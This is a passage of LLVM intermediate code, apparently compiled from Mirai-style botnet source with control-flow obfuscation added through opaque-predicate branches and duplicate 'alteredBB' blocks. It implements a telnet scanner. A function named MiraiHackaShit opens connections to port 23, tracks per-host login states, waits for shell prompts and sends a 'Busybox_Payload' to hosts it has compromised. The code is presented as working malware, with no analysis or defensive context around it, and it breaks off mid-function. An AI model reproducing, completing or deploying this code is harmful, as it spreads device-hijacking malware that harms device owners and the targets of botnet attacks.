  %1016 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1015, i32 0, i32 3
  store i8 0, i8* %1016, align 4
  %1017 = load i32, i32* %3, align 4
  %1018 = sext i32 %1017 to i64
  %1019 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %1018
  %1020 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1019, i32 0, i32 4
  store i8 1, i8* %1020, align 1
  br label %1156

; <label>:1021:                                   ; preds = %1001
  %1022 = load i32, i32* @x.97
  %1023 = load i32, i32* @y.98
  %1024 = sub i32 %1022, 1
  %1025 = mul i32 %1022, %1024
  %1026 = urem i32 %1025, 2
  %1027 = icmp eq i32 %1026, 0
  %1028 = icmp slt i32 %1023, 10
  %1029 = or i1 %1027, %1028
  br i1 %1029, label %originalBB80, label %originalBB80alteredBB

originalBB80:                                     ; preds = %originalBB80alteredBB, %1021
  %1030 = load i32, i32* %3, align 4
  %1031 = sext i32 %1030 to i64
  %1032 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %1031
  %1033 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1032, i32 0, i32 3
  store i8 8, i8* %1033, align 4
  %1034 = load i32, i32* @x.97
  %1035 = load i32, i32* @y.98
  %1036 = sub i32 %1034, 1
  %1037 = mul i32 %1034, %1036
  %1038 = urem i32 %1037, 2
  %1039 = icmp eq i32 %1038, 0
  %1040 = icmp slt i32 %1035, 10
  %1041 = or i1 %1039, %1040
  br i1 %1041, label %originalBBpart282, label %originalBB80alteredBB

originalBBpart282:                                ; preds = %originalBB80
  br label %1155

; <label>:1042:                                   ; preds = %122
  %1043 = load i32, i32* @x.97
  %1044 = load i32, i32* @y.98
  %1045 = sub i32 %1043, 1
  %1046 = mul i32 %1043, %1045
  %1047 = urem i32 %1046, 2
  %1048 = icmp eq i32 %1047, 0
  %1049 = icmp slt i32 %1044, 10
  %1050 = or i1 %1048, %1049
  br i1 %1050, label %originalBB84, label %originalBB84alteredBB

originalBB84:                                     ; preds = %originalBB84alteredBB, %1042
  %1051 = call i64 @time(i64* null) #5
  %1052 = trunc i64 %1051 to i32
  %1053 = load i32, i32* %3, align 4
  %1054 = sext i32 %1053 to i64
  %1055 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %1054
  %1056 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1055, i32 0, i32 9
  store i32 %1052, i32* %1056, align 8
  %1057 = load i32, i32* %3, align 4
  %1058 = sext i32 %1057 to i64
  %1059 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %1058
  %1060 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1059, i32 0, i32 0
  %1061 = load i32, i32* %1060, align 8
  %1062 = load i8*, i8** @Busybox_Payload, align 8
  %1063 = load i8*, i8** @Busybox_Payload, align 8
  %1064 = call i64 @strlen(i8* %1063) #9
  %1065 = call i64 @send(i32 %1061, i8* %1062, i64 %1064, i32 16384)
  %1066 = icmp slt i64 %1065, 0
  %1067 = load i32, i32* @x.97
  %1068 = load i32, i32* @y.98
  %1069 = sub i32 %1067, 1
  %1070 = mul i32 %1067, %1069
  %1071 = urem i32 %1070, 2
  %1072 = icmp eq i32 %1071, 0
  %1073 = icmp slt i32 %1068, 10
  %1074 = or i1 %1072, %1073
  br i1 %1074, label %originalBBpart286, label %originalBB84alteredBB

originalBBpart286:                                ; preds = %originalBB84
  br i1 %1066, label %1075, label %1090

; <label>:1075:                                   ; preds = %originalBBpart286
  %1076 = load i32, i32* %3, align 4
  %1077 = sext i32 %1076 to i64
  %1078 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %1077
  %1079 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1078, i32 0, i32 0
  %1080 = load i32, i32* %1079, align 8
  %1081 = call i32 @sclose(i32 %1080)
  %1082 = load i32, i32* %3, align 4
  %1083 = sext i32 %1082 to i64
  %1084 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %1083
  %1085 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1084, i32 0, i32 3
  store i8 0, i8* %1085, align 4
  %1086 = load i32, i32* %3, align 4
  %1087 = sext i32 %1086 to i64
  %1088 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %1087
  %1089 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1088, i32 0, i32 4
  store i8 1, i8* %1089, align 1
  br label %1156

; <label>:1090:                                   ; preds = %originalBBpart286
  %1091 = load i32, i32* @x.97
  %1092 = load i32, i32* @y.98
  %1093 = sub i32 %1091, 1
  %1094 = mul i32 %1091, %1093
  %1095 = urem i32 %1094, 2
  %1096 = icmp eq i32 %1095, 0
  %1097 = icmp slt i32 %1092, 10
  %1098 = or i1 %1096, %1097
  br i1 %1098, label %originalBB88, label %originalBB88alteredBB

originalBB88:                                     ; preds = %originalBB88alteredBB, %1090
  %1099 = load i32, i32* %3, align 4
  %1100 = sext i32 %1099 to i64
  %1101 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %1100
  %1102 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1101, i32 0, i32 4
  store i8 3, i8* %1102, align 1
  %1103 = load i32, i32* %3, align 4
  %1104 = sext i32 %1103 to i64
  %1105 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %1104
  %1106 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1105, i32 0, i32 9
  %1107 = load i32, i32* %1106, align 8
  %1108 = add i32 %1107, 60
  %1109 = zext i32 %1108 to i64
  %1110 = call i64 @time(i64* null) #5
  %1111 = icmp slt i64 %1109, %1110
  %1112 = load i32, i32* @x.97
  %1113 = load i32, i32* @y.98
  %1114 = sub i32 %1112, 1
  %1115 = mul i32 %1112, %1114
  %1116 = urem i32 %1115, 2
  %1117 = icmp eq i32 %1116, 0
  %1118 = icmp slt i32 %1113, 10
  %1119 = or i1 %1117, %1118
  br i1 %1119, label %originalBBpart2103, label %originalBB88alteredBB

originalBBpart2103:                               ; preds = %originalBB88
  br i1 %1111, label %1120, label %1138

; <label>:1120:                                   ; preds = %originalBBpart2103
  %1121 = load i32, i32* %3, align 4
  %1122 = sext i32 %1121 to i64
  %1123 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %1122
  %1124 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1123, i32 0, i32 4
  %1125 = load i8, i8* %1124, align 1
  %1126 = zext i8 %1125 to i32
  %1127 = icmp ne i32 %1126, 3
  br i1 %1127, label %1128, label %1129

; <label>:1128:                                   ; preds = %1120
  br label %1129

; <label>:1129:                                   ; preds = %1128, %1120
  %1130 = load i32, i32* %3, align 4
  %1131 = sext i32 %1130 to i64
  %1132 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %1131
  %1133 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1132, i32 0, i32 3
  store i8 0, i8* %1133, align 4
  %1134 = load i32, i32* %3, align 4
  %1135 = sext i32 %1134 to i64
  %1136 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %1135
  %1137 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1136, i32 0, i32 4
  store i8 1, i8* %1137, align 1
  br label %1138

; <label>:1138:                                   ; preds = %1129, %originalBBpart2103
  %1139 = load i32, i32* @x.97
  %1140 = load i32, i32* @y.98
  %1141 = sub i32 %1139, 1
  %1142 = mul i32 %1139, %1141
  %1143 = urem i32 %1142, 2
  %1144 = icmp eq i32 %1143, 0
  %1145 = icmp slt i32 %1140, 10
  %1146 = or i1 %1144, %1145
  br i1 %1146, label %originalBB105, label %originalBB105alteredBB

originalBB105:                                    ; preds = %originalBB105alteredBB, %1138
  %1147 = load i32, i32* @x.97
  %1148 = load i32, i32* @y.98
  %1149 = sub i32 %1147, 1
  %1150 = mul i32 %1147, %1149
  %1151 = urem i32 %1150, 2
  %1152 = icmp eq i32 %1151, 0
  %1153 = icmp slt i32 %1148, 10
  %1154 = or i1 %1152, %1153
  br i1 %1154, label %originalBBpart2107, label %originalBB105alteredBB

originalBBpart2107:                               ; preds = %originalBB105
  br label %1155

; <label>:1155:                                   ; preds = %originalBBpart2107, %originalBBpart282, %1000, %originalBBpart278, %794, %722, %670, %originalBBpart246, %314, %122
  br label %1156

; <label>:1156:                                   ; preds = %1155, %1075, %1012, %980, %originalBBpart274, %820, %774, %713, %696, %originalBBpart262, %originalBBpart234, %429, %235, %205, %originalBBpart214
  %1157 = load i32, i32* %3, align 4
  %1158 = add nsw i32 %1157, 1
  store i32 %1158, i32* %3, align 4
  br label %88

; <label>:1159:                                   ; preds = %originalBBpart210
  br label %86
                                                  ; No predecessors!
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %36
  %1161 = load i32, i32* %3, align 4
  %1162 = sext i32 %1161 to i64
  %1163 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %1162
  %1164 = bitcast %struct.telstate_t* %1163 to i8*
  call void @llvm.memset.p0i8.i64(i8* %1164, i8 0, i64 40, i32 8, i1 false)
  %1165 = load i32, i32* %3, align 4
  %1166 = sext i32 %1165 to i64
  %1167 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %1166
  %1168 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1167, i32 0, i32 4
  store i8 1, i8* %1168, align 1
  %1169 = call noalias i8* @malloc(i64 257) #5
  %1170 = load i32, i32* %3, align 4
  %1171 = sext i32 %1170 to i64
  %1172 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %1171
  %1173 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1172, i32 0, i32 11
  store i8* %1169, i8** %1173, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %66
  %1174 = load i32, i32* %3, align 4
  %_ = sub i32 %1174, 1
  %gen = mul i32 %_, 1
  %_2 = sub i32 0, %1174
  %gen3 = add i32 %_2, 1
  %_4 = shl i32 %1174, 1
  %1175 = add nsw i32 %1174, 1
  store i32 %1175, i32* %3, align 4
  br label %originalBB1

originalBB8alteredBB:                             ; preds = %originalBB8, %88
  %1176 = load i32, i32* %3, align 4
  %1177 = load i32, i32* %2, align 4
  %1178 = icmp slt i32 %1176, %1177
  br label %originalBB8

originalBB12alteredBB:                            ; preds = %originalBB12, %176
  %1179 = load i32, i32* %3, align 4
  %1180 = sext i32 %1179 to i64
  %1181 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %1180
  %1182 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1181, i32 0, i32 4
  store i8 1, i8* %1182, align 1
  br label %originalBB12

originalBB16alteredBB:                            ; preds = %originalBB16, %262
  %1183 = load i32, i32* %3, align 4
  %1184 = sext i32 %1183 to i64
  %1185 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %1184
  %1186 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1185, i32 0, i32 0
  %1187 = load i32, i32* %1186, align 8
  %1188 = call i32 @sclose(i32 %1187)
  %1189 = load i32, i32* %3, align 4
  %1190 = sext i32 %1189 to i64
  %1191 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %1190
  %1192 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1191, i32 0, i32 4
  store i8 1, i8* %1192, align 1
  br label %originalBB16

originalBB20alteredBB:                            ; preds = %originalBB20, %289
  %1193 = load i32, i32* %3, align 4
  %1194 = sext i32 %1193 to i64
  %1195 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %1194
  %1196 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1195, i32 0, i32 3
  store i8 1, i8* %1196, align 4
  %1197 = load i32, i32* %3, align 4
  %1198 = sext i32 %1197 to i64
  %1199 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %1198
  %1200 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1199, i32 0, i32 9
  store i32 0, i32* %1200, align 8
  br label %originalBB20

originalBB24alteredBB:                            ; preds = %originalBB24, %357
  store i32 4, i32* %8, align 4
  store i32 0, i32* %5, align 4
  %1201 = load i32, i32* %3, align 4
  %1202 = sext i32 %1201 to i64
  %1203 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %1202
  %1204 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1203, i32 0, i32 0
  %1205 = load i32, i32* %1204, align 8
  %1206 = bitcast i32* %5 to i8*
  %1207 = call i32 @getsockopt(i32 %1205, i32 1, i32 4, i8* %1206, i32* %8) #5
  %1208 = load i32, i32* %5, align 4
  %1209 = icmp ne i32 %1208, 0
  br label %originalBB24

originalBB28alteredBB:                            ; preds = %originalBB28, %430
  %1210 = load i32, i32* %4, align 4
  %1211 = icmp eq i32 %1210, -1
  br label %originalBB28

originalBB32alteredBB:                            ; preds = %originalBB32, %449
  %1212 = load i32, i32* %3, align 4
  %1213 = sext i32 %1212 to i64
  %1214 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %1213
  %1215 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1214, i32 0, i32 0
  %1216 = load i32, i32* %1215, align 8
  %1217 = call i32 @sclose(i32 %1216)
  %1218 = load i32, i32* %3, align 4
  %1219 = sext i32 %1218 to i64
  %1220 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %1219
  %1221 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1220, i32 0, i32 3
  store i8 0, i8* %1221, align 4
  %1222 = load i32, i32* %3, align 4
  %1223 = sext i32 %1222 to i64
  %1224 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %1223
  %1225 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1224, i32 0, i32 4
  store i8 1, i8* %1225, align 1
  br label %originalBB32

originalBB36alteredBB:                            ; preds = %originalBB36, %480
  br label %originalBB36

originalBB40alteredBB:                            ; preds = %originalBB40, %507
  %1226 = load i32, i32* %3, align 4
  %1227 = sext i32 %1226 to i64
  %1228 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %1227
  %1229 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1228, i32 0, i32 0
  %1230 = load i32, i32* %1229, align 8
  %1231 = call i32 @sclose(i32 %1230)
  %1232 = load i32, i32* %3, align 4
  %1233 = sext i32 %1232 to i64
  %1234 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %1233
  %1235 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1234, i32 0, i32 3
  store i8 0, i8* %1235, align 4
  %1236 = load i32, i32* %3, align 4
  %1237 = sext i32 %1236 to i64
  %1238 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %1237
  %1239 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1238, i32 0, i32 4
  store i8 1, i8* %1239, align 1
  br label %originalBB40

originalBB44alteredBB:                            ; preds = %originalBB44, %538
  br label %originalBB44

originalBB48alteredBB:                            ; preds = %originalBB48, %555
  %1240 = load i32, i32* %3, align 4
  %1241 = sext i32 %1240 to i64
  %1242 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %1241
  %1243 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1242, i32 0, i32 0
  %1244 = load i32, i32* %1243, align 8
  %1245 = load i32, i32* %3, align 4
  %1246 = sext i32 %1245 to i64
  %1247 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %1246
  %1248 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1247, i32 0, i32 11
  %1249 = load i8*, i8** %1248, align 8
  %1250 = call i32 @read_until_response(i32 %1244, i32 10000, i8* %1249, i32 256, i8** getelementptr inbounds ([13 x i8*], [13 x i8*]* @advances, i32 0, i32 0))
  %1251 = icmp ne i32 %1250, 0
  br label %originalBB48

originalBB52alteredBB:                            ; preds = %originalBB52, %592
  %1252 = load i32, i32* %3, align 4
  %1253 = sext i32 %1252 to i64
  %1254 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %1253
  %1255 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1254, i32 0, i32 3
  store i8 0, i8* %1255, align 4
  br label %originalBB52

originalBB56alteredBB:                            ; preds = %originalBB56, %613
  %1256 = load i32, i32* %3, align 4
  %1257 = sext i32 %1256 to i64
  %1258 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %1257
  %1259 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1258, i32 0, i32 3
  store i8 3, i8* %1259, align 4
  br label %originalBB56

originalBB60alteredBB:                            ; preds = %originalBB60, %634
  br label %originalBB60

originalBB64alteredBB:                            ; preds = %originalBB64, %748
  %1260 = load i32, i32* %3, align 4
  %1261 = sext i32 %1260 to i64
  %1262 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %1261
  %1263 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1262, i32 0, i32 3
  store i8 0, i8* %1263, align 4
  br label %originalBB64

originalBB68alteredBB:                            ; preds = %originalBB68, %829
  %1264 = load i32, i32* %3, align 4
  %1265 = sext i32 %1264 to i64
  %1266 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %1265
  %1267 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1266, i32 0, i32 0
  %1268 = load i32, i32* %1267, align 8
  %1269 = call i64 @send(i32 %1268, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.866, i32 0, i32 0), i64 2, i32 16384)
  %1270 = icmp slt i64 %1269, 0
  br label %originalBB68

originalBB72alteredBB:                            ; preds = %originalBB72, %853
  %1271 = load i32, i32* %3, align 4
  %1272 = sext i32 %1271 to i64
  %1273 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %1272
  %1274 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1273, i32 0, i32 3
  store i8 0, i8* %1274, align 4
  %1275 = load i32, i32* %3, align 4
  %1276 = sext i32 %1275 to i64
  %1277 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %1276
  %1278 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1277, i32 0, i32 4
  store i8 1, i8* %1278, align 1
  br label %originalBB72

originalBB76alteredBB:                            ; preds = %originalBB76, %878
  %1279 = load i32, i32* %3, align 4
  %1280 = sext i32 %1279 to i64
  %1281 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %1280
  %1282 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1281, i32 0, i32 3
  store i8 6, i8* %1282, align 4
  br label %originalBB76

originalBB80alteredBB:                            ; preds = %originalBB80, %1021
  %1283 = load i32, i32* %3, align 4
  %1284 = sext i32 %1283 to i64
  %1285 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %1284
  %1286 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1285, i32 0, i32 3
  store i8 8, i8* %1286, align 4
  br label %originalBB80

originalBB84alteredBB:                            ; preds = %originalBB84, %1042
  %1287 = call i64 @time(i64* null) #5
  %1288 = trunc i64 %1287 to i32
  %1289 = load i32, i32* %3, align 4
  %1290 = sext i32 %1289 to i64
  %1291 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %1290
  %1292 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1291, i32 0, i32 9
  store i32 %1288, i32* %1292, align 8
  %1293 = load i32, i32* %3, align 4
  %1294 = sext i32 %1293 to i64
  %1295 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %1294
  %1296 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1295, i32 0, i32 0
  %1297 = load i32, i32* %1296, align 8
  %1298 = load i8*, i8** @Busybox_Payload, align 8
  %1299 = load i8*, i8** @Busybox_Payload, align 8
  %1300 = call i64 @strlen(i8* %1299) #9
  %1301 = call i64 @send(i32 %1297, i8* %1298, i64 %1300, i32 16384)
  %1302 = icmp slt i64 %1301, 0
  br label %originalBB84

originalBB88alteredBB:                            ; preds = %originalBB88, %1090
  %1303 = load i32, i32* %3, align 4
  %1304 = sext i32 %1303 to i64
  %1305 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %1304
  %1306 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1305, i32 0, i32 4
  store i8 3, i8* %1306, align 1
  %1307 = load i32, i32* %3, align 4
  %1308 = sext i32 %1307 to i64
  %1309 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %1308
  %1310 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1309, i32 0, i32 9
  %1311 = load i32, i32* %1310, align 8
  %_89 = sub i32 %1311, 60
  %gen90 = mul i32 %_89, 60
  %_91 = sub i32 %1311, 60
  %gen92 = mul i32 %_91, 60
  %_93 = shl i32 %1311, 60
  %_94 = shl i32 %1311, 60
  %_95 = sub i32 0, %1311
  %gen96 = add i32 %_95, 60
  %_97 = sub i32 0, %1311
  %gen98 = add i32 %_97, 60
  %_99 = sub i32 0, %1311
  %gen100 = add i32 %_99, 60
  %_101 = shl i32 %1311, 60
  %1312 = add i32 %1311, 60
  %1313 = zext i32 %1312 to i64
  %1314 = call i64 @time(i64* null) #5
  %1315 = icmp slt i64 %1313, %1314
  br label %originalBB88

originalBB105alteredBB:                           ; preds = %originalBB105, %1138
  br label %originalBB105
}

; Function Attrs: noinline nounwind uwtable
define void @MiraiHackaShit() #0 {
  %1 = load i32, i32* @x.99
  %2 = load i32, i32* @y.100
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca [128 x i8], align 16
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.fd_set, align 8
  %15 = alloca %struct.timeval, align 8
  %16 = alloca i32, align 4
  %17 = alloca %struct.sockaddr_in, align 4
  %18 = alloca i8*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i32 256, i32* %10, align 4
  %22 = call i64 @time(i64* null) #5
  %23 = call i32 @rand_cmwc()
  %24 = zext i32 %23 to i64
  %25 = xor i64 %22, %24
  %26 = trunc i64 %25 to i32
  call void @srand(i32 %26) #5
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = call zeroext i16 @htons(i16 zeroext 23) #10
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %28, i16* %29, align 2
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 3
  %31 = getelementptr inbounds [8 x i8], [8 x i8]* %30, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %31, i8 0, i64 8, i32 4, i1 false)
  %32 = load i32, i32* %10, align 4
  %33 = zext i32 %32 to i64
  %34 = call i8* @llvm.stacksave()
  store i8* %34, i8** %18, align 8
  %35 = alloca %struct.telstate_t, i64 %33, align 16
  %36 = bitcast %struct.telstate_t* %35 to i8*
  %37 = load i32, i32* %10, align 4
  %38 = sext i32 %37 to i64
  %39 = mul i64 %38, 5
  call void @llvm.memset.p0i8.i64(i8* %36, i8 0, i64 %39, i32 16, i1 false)
  store i32 0, i32* %11, align 4
  %40 = load i32, i32* @x.99
  %41 = load i32, i32* @y.100
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %48

; <label>:48:                                     ; preds = %originalBBpart217, %originalBBpart2
  %49 = load i32, i32* @x.99
  %50 = load i32, i32* @y.100
  %51 = sub i32 %49, 1
  %52 = mul i32 %49, %51
  %53 = urem i32 %52, 2
  %54 = icmp eq i32 %53, 0
  %55 = icmp slt i32 %50, 10
  %56 = or i1 %54, %55
  br i1 %56, label %originalBB3, label %originalBB3alteredBB

originalBB3:                                      ; preds = %originalBB3alteredBB, %48
  %57 = load i32, i32* %11, align 4
  %58 = load i32, i32* %10, align 4
  %59 = icmp slt i32 %57, %58
  %60 = load i32, i32* @x.99
  %61 = load i32, i32* @y.100
  %62 = sub i32 %60, 1
  %63 = mul i32 %60, %62
  %64 = urem i32 %63, 2
  %65 = icmp eq i32 %64, 0
  %66 = icmp slt i32 %61, 10
  %67 = or i1 %65, %66
  br i1 %67, label %originalBBpart25, label %originalBB3alteredBB

originalBBpart25:                                 ; preds = %originalBB3
  br i1 %59, label %68, label %101

; <label>:68:                                     ; preds = %originalBBpart25
  %69 = load i32, i32* %11, align 4
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %70
  %72 = bitcast %struct.telstate_t* %71 to i8*
  call void @llvm.memset.p0i8.i64(i8* %72, i8 0, i64 40, i32 8, i1 false)
  %73 = load i32, i32* %11, align 4
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %74
  %76 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %75, i32 0, i32 4
  store i8 1, i8* %76, align 1
  %77 = call noalias i8* @malloc(i64 257) #5
  %78 = load i32, i32* %11, align 4
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %79
  %81 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %80, i32 0, i32 11
  store i8* %77, i8** %81, align 8
  br label %82

; <label>:82:                                     ; preds = %68
  %83 = load i32, i32* @x.99
  %84 = load i32, i32* @y.100
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBB7, label %originalBB7alteredBB

originalBB7:                                      ; preds = %originalBB7alteredBB, %82
  %91 = load i32, i32* %11, align 4
  %92 = add nsw i32 %91, 1
  store i32 %92, i32* %11, align 4
  %93 = load i32, i32* @x.99
  %94 = load i32, i32* @y.100
  %95 = sub i32 %93, 1
  %96 = mul i32 %93, %95
  %97 = urem i32 %96, 2
  %98 = icmp eq i32 %97, 0
  %99 = icmp slt i32 %94, 10
  %100 = or i1 %98, %99
  br i1 %100, label %originalBBpart217, label %originalBB7alteredBB

originalBBpart217:                                ; preds = %originalBB7
  br label %48

; <label>:101:                                    ; preds = %originalBBpart25
  %102 = load i32, i32* @x.99
  %103 = load i32, i32* @y.100
  %104 = sub i32 %102, 1
  %105 = mul i32 %102, %104
  %106 = urem i32 %105, 2
  %107 = icmp eq i32 %106, 0
  %108 = icmp slt i32 %103, 10
  %109 = or i1 %107, %108
  br i1 %109, label %originalBB19, label %originalBB19alteredBB

originalBB19:                                     ; preds = %originalBB19alteredBB, %101
  %110 = load i32, i32* @x.99
  %111 = load i32, i32* @y.100
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBBpart221, label %originalBB19alteredBB

originalBBpart221:                                ; preds = %originalBB19
  br label %118

; <label>:118:                                    ; preds = %1287, %originalBBpart221
  br label %119

; <label>:119:                                    ; preds = %118
  store i32 0, i32* %11, align 4
  br label %120

; <label>:120:                                    ; preds = %1284, %119
  %121 = load i32, i32* @x.99
  %122 = load i32, i32* @y.100
  %123 = sub i32 %121, 1
  %124 = mul i32 %121, %123
  %125 = urem i32 %124, 2
  %126 = icmp eq i32 %125, 0
  %127 = icmp slt i32 %122, 10
  %128 = or i1 %126, %127
  br i1 %128, label %originalBB23, label %originalBB23alteredBB

originalBB23:                                     ; preds = %originalBB23alteredBB, %120
  %129 = load i32, i32* %11, align 4
  %130 = load i32, i32* %10, align 4
  %131 = icmp slt i32 %129, %130
  %132 = load i32, i32* @x.99
  %133 = load i32, i32* @y.100
  %134 = sub i32 %132, 1
  %135 = mul i32 %132, %134
  %136 = urem i32 %135, 2
  %137 = icmp eq i32 %136, 0
  %138 = icmp slt i32 %133, 10
  %139 = or i1 %137, %138
  br i1 %139, label %originalBBpart225, label %originalBB23alteredBB

originalBBpart225:                                ; preds = %originalBB23
  br i1 %131, label %140, label %1287

; <label>:140:                                    ; preds = %originalBBpart225
  %141 = load i32, i32* %11, align 4
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %142
  %144 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %143, i32 0, i32 9
  %145 = load i32, i32* %144, align 8
  %146 = icmp eq i32 %145, 0
  br i1 %146, label %147, label %154

; <label>:147:                                    ; preds = %140
  %148 = call i64 @time(i64* null) #5
  %149 = trunc i64 %148 to i32
  %150 = load i32, i32* %11, align 4
  %151 = sext i32 %150 to i64
